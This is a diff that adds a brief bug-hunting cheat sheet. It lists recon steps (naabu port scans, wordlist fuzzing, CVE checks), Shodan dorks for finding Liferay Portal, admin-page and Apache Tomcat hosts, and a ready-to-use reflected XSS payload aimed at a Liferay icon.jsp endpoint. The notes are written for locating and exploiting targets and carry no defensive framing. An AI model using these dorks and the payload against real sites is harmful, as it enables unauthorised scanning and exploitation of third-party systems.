@@ -1,0 +1,22 @@
+#######################################################################
+when you finding any ip or any subdomain 
+then check the specific version of running and check the cve and exploit 
+then first identify the port through naabu for fast result
+then fuzzing the wordlists of the target(examples directory)
+
+basic method:
+ I prepared Shodan for search on the target domain IPs so used that dork :
+
+html:"liferayPortalCSS"
+
+Now after selecting the target we have to use this payload for exploiting RXSS
+
+/o/marketplace-app-manager-web/icon.jsp?iconURL=https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
+#########################################################################
+
+ssl:redacted http.html:admin
+OR
+ssl.cert.subject.cn:redacted http.html:admin
+
+http.title:"Apache Tomcat"
+
